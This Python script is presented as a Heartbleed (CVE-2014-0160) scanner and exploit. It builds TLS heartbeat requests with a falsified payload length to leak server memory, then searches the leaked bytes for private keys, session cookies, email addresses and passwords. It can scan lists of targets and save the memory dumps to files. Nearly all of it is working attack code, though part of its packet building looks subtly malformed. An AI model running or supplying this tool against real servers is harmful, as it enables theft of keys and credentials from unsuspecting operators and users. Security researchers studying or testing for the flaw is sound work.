#!/usr/bin/env python3
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Based on public research and exploits for CVE-2014-0160
# Original vulnerability discovered by:
#  Neel Mehta (Google Security Team)
#  Riku HietamÃ¤ki, Antti Karjalainen and Matti Kamunen (Codenomicon)
#
# Exploit adapted for repository by:
#  Hyperion Gray Security Research Team
#

"""
Heartbleed (CVE-2014-0160) OpenSSL Memory Disclosure Scanner and Exploit

This tool tests for and exploits the Heartbleed vulnerability in OpenSSL.
The vulnerability allows reading arbitrary memory from the server through
malformed TLS heartbeat requests.

Affected versions:
- OpenSSL 1.0.1 through 1.0.1f
- OpenSSL 1.0.2-beta through 1.0.2-beta1

The exploit works by sending a TLS heartbeat request with a falsified
payload length, causing the server to return more data than intended,
potentially including sensitive information from memory.
"""

import argparse
import socket
import struct
import sys
import time
import re
from binascii import hexlify, unhexlify

# TLS record types
TLS_HANDSHAKE = 22
TLS_HEARTBEAT = 24

# TLS versions
TLS_1_0 = 0x0301
TLS_1_1 = 0x0302
TLS_1_2 = 0x0303

# Heartbeat message types
HEARTBEAT_REQUEST = 1
HEARTBEAT_RESPONSE = 2

def build_client_hello(tls_version=TLS_1_2):
    """Build a TLS Client Hello message"""
    # Random 32 bytes (4 bytes timestamp + 28 random bytes)
    client_random = b'\x00' * 32
    
    # Session ID (empty)
    session_id = b''
    
    # Cipher suites (just include a few common ones)
    cipher_suites = struct.pack('>H', 4)  # Length
    cipher_suites += struct.pack('>HH', 0x002f, 0x0035)  # AES128-SHA, AES256-SHA
    
    # Compression methods (null compression)
    compression = b'\x01\x00'
    
    # Extensions (including heartbeat)
    extensions = b''
    
    # Heartbeat extension
    heartbeat_ext = struct.pack('>HH', 15, 1) + b'\x01'  # Extension type 15, length 1, peer_allowed_to_send
    extensions += heartbeat_ext
    
    # Build the complete Client Hello
    hello_body = client_random + struct.pack('B', len(session_id)) + session_id
    hello_body += cipher_suites + compression
    hello_body += struct.pack('>H', len(extensions)) + extensions
    
    # Handshake header
    handshake_msg = struct.pack('B', 1)  # Client Hello type
    handshake_msg += struct.pack('>I', len(hello_body))[1:]  # Length (24-bit)
    handshake_msg += hello_body
    
    # TLS record header
    record = struct.pack('BBH', TLS_HANDSHAKE, tls_version >> 8, tls_version & 0xff)
    record += struct.pack('>H', len(handshake_msg))
    record += handshake_msg
    
    return record

def build_heartbeat_request(payload_length=65535):
    """Build a malicious heartbeat request"""
    # Heartbeat request with falsified length
    heartbeat_msg = struct.pack('B', HEARTBEAT_REQUEST)  # Type
    heartbeat_msg += struct.pack('>H', payload_length)   # Falsified payload length
    heartbeat_msg += b'YELLOW SUBMARINE' * 4  # Actual payload (64 bytes)
    
    # TLS record header
    record = struct.pack('BBH', TLS_HEARTBEAT, TLS_1_2 >> 8, TLS_1_2 & 0xff)
    record += struct.pack('>H', len(heartbeat_msg))
    record += heartbeat_msg
    
    return record

def parse_tls_record(data):
    """Parse a TLS record header"""
    if len(data) < 5:
        return None, None, None
    
    record_type = data[0]
    version = struct.unpack('>H', data[1:3])[0]
    length = struct.unpack('>H', data[3:5])[0]
    
    return record_type, version, length

def extract_heartbeat_response(data):
    """Extract and return heartbeat response payload"""
    if len(data) < 8:
        return None
    
    # Skip TLS record header (5 bytes)
    heartbeat_data = data[5:]
    
    if len(heartbeat_data) < 3:
        return None
    
    msg_type = heartbeat_data[0]
    payload_length = struct.unpack('>H', heartbeat_data[1:3])[0]
    
    if msg_type != HEARTBEAT_RESPONSE:
        return None
    
    # Return the payload (skip 3-byte header)
    return heartbeat_data[3:3+payload_length]

def connect_and_exploit(host, port, tls_version=TLS_1_2, timeout=10):
    """Connect to target and attempt Heartbleed exploitation"""
    try:
        # Create socket and connect
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # Send Client Hello
        client_hello = build_client_hello(tls_version)
        sock.send(client_hello)
        
        # Read server responses (Server Hello, Certificate, etc.)
        # We need to read until we get Server Hello Done
        server_hello_done = False
        while not server_hello_done:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                
                # Look for Server Hello Done (handshake type 14)
                if b'\x0e\x00\x00\x00' in data:
                    server_hello_done = True
                    
            except socket.timeout:
                break
        
        # Send heartbeat request
        heartbeat_req = build_heartbeat_request()
        sock.send(heartbeat_req)
        
        # Read heartbeat response
        try:
            response = sock.recv(65536)
            sock.close()
            
            if response:
                payload = extract_heartbeat_response(response)
                if payload and len(payload) > 64:  # More than our actual payload
                    return True, payload
                else:
                    return False, None
            else:
                return False, None
                
        except socket.timeout:
            sock.close()
            return False, None
            
    except Exception as e:
        return False, str(e)

def analyze_memory(data):
    """Analyze extracted memory for interesting content"""
    if not data:
        return {}
    
    analysis = {}
    
    # Look for private key patterns
    pem_patterns = [
        b'-----BEGIN PRIVATE KEY-----',
        b'-----BEGIN RSA PRIVATE KEY-----',
        b'-----BEGIN EC PRIVATE KEY-----'
    ]
    
    for pattern in pem_patterns:
        if pattern in data:
            analysis['private_key'] = True
            break
    else:
        analysis['private_key'] = False
    
    # Look for session cookies
    cookie_pattern = re.compile(rb'[Cc]ookie:\s*([^\r\n]+)')
    cookies = cookie_pattern.findall(data)
    if cookies:
        analysis['cookies'] = [cookie.decode('utf-8', errors='ignore') for cookie in cookies]
    
    # Look for HTTP headers
    http_pattern = re.compile(rb'HTTP/\d\.\d\s+\d+')
    if http_pattern.search(data):
        analysis['http_traffic'] = True
    
    # Look for email addresses
    email_pattern = re.compile(rb'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
    emails = email_pattern.findall(data)
    if emails:
        analysis['emails'] = [email.decode('utf-8', errors='ignore') for email in emails[:5]]  # Limit to 5
    
    # Look for passwords (basic patterns)
    password_patterns = [rb'password[=:]\s*([^\s\r\n]+)', rb'passwd[=:]\s*([^\s\r\n]+)']
    passwords = []
    for pattern in password_patterns:
        matches = re.findall(pattern, data, re.IGNORECASE)
        passwords.extend([match.decode('utf-8', errors='ignore') for match in matches])
    
    if passwords:
        analysis['passwords'] = passwords[:3]  # Limit to 3
    
    return analysis

def print_hex_dump(data, max_bytes=512):
    """Print hex dump of data"""
    data = data[:max_bytes]
    for i in range(0, len(data), 16):
        hex_part = ' '.join(f'{b:02x}' for b in data[i:i+16])
        ascii_part = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in data[i:i+16])
        print(f'{i:08x}  {hex_part:<48} |{ascii_part}|')

def main():
    parser = argparse.ArgumentParser(
        description='Heartbleed (CVE-2014-0160) Scanner and Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python exploit.py -t example.com -p 443
  python exploit.py -t example.com -p 443 -v --hex-dump
  python exploit.py -f targets.txt -q
  python exploit.py -t example.com -p 443 --analyze
        """
    )
    
    parser.add_argument('-t', '--target', help='Target hostname or IP address')
    parser.add_argument('-p', '--port', type=int, default=443, help='Target port (default: 443)')
    parser.add_argument('-f', '--file', help='File containing list of targets (host:port format)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (only show vulnerable hosts)')
    parser.add_argument('--hex-dump', action='store_true', help='Show hex dump of extracted memory')
    parser.add_argument('--analyze', action='store_true', help='Analyze extracted memory for sensitive data')
    parser.add_argument('-o', '--output', help='Save extracted memory to file')
    parser.add_argument('--timeout', type=int, default=10, help='Connection timeout (default: 10)')
    parser.add_argument('--tls-version', choices=['1.0', '1.1', '1.2'], default='1.2', 
                       help='TLS version to use (default: 1.2)')
    
    args = parser.parse_args()
    
    if not args.target and not args.file:
        parser.error('Must specify either --target or --file')
    
    # Convert TLS version
    tls_versions = {'1.0': TLS_1_0, '1.1': TLS_1_1, '1.2': TLS_1_2}
    tls_version = tls_versions[args.tls_version]
    
    targets = []
    if args.target:
        targets.append((args.target, args.port))
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        host, port = line.split(':', 1)
                        targets.append((host, int(port)))
                    else:
                        targets.append((line, 443))
        except Exception as e:
            print(f"Error reading file: {e}")
            return 1
    
    vulnerable_count = 0
    
    for host, port in targets:
        if not args.quiet:
            print(f"Testing {host}:{port}...")
        
        vulnerable, result = connect_and_exploit(host, port, tls_version, args.timeout)
        
        if vulnerable:
            vulnerable_count += 1
            print(f"[VULNERABLE] {host}:{port} - Heartbleed detected!")
            
            if args.verbose:
                print(f"Extracted {len(result)} bytes of memory")
            
            if args.hex_dump and result:
                print("\nMemory dump:")
                print_hex_dump(result)
                print()
            
            if args.analyze and result:
                analysis = analyze_memory(result)
                print("\nMemory analysis:")
                if analysis.get('private_key'):
                    print("  [!] Possible private key found in memory!")
                if analysis.get('cookies'):
                    print(f"  [!] Found {len(analysis['cookies'])} session cookies")
                if analysis.get('http_traffic'):
                    print("  [!] HTTP traffic found in memory")
                if analysis.get('emails'):
                    print(f"  [!] Found email addresses: {', '.join(analysis['emails'])}")
                if analysis.get('passwords'):
                    print(f"  [!] Possible passwords found: {len(analysis['passwords'])} entries")
                print()
            
            if args.output and result:
                try:
                    with open(args.output, 'wb') as f:
                        f.write(result)
                    print(f"Memory dump saved to {args.output}")
                except Exception as e:
                    print(f"Error saving to file: {e}")
        
        elif not args.quiet:
            if isinstance(result, str):  # Error message
                print(f"[ERROR] {host}:{port} - {result}")
            else:
                print(f"[SAFE] {host}:{port} - Not vulnerable or not exploitable")
    
    if not args.quiet:
        print(f"\nScan complete. Found {vulnerable_count} vulnerable hosts out of {len(targets)} tested.")
    
    return 0 if vulnerable_count == 0 else 1

if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
        sys.exit(1)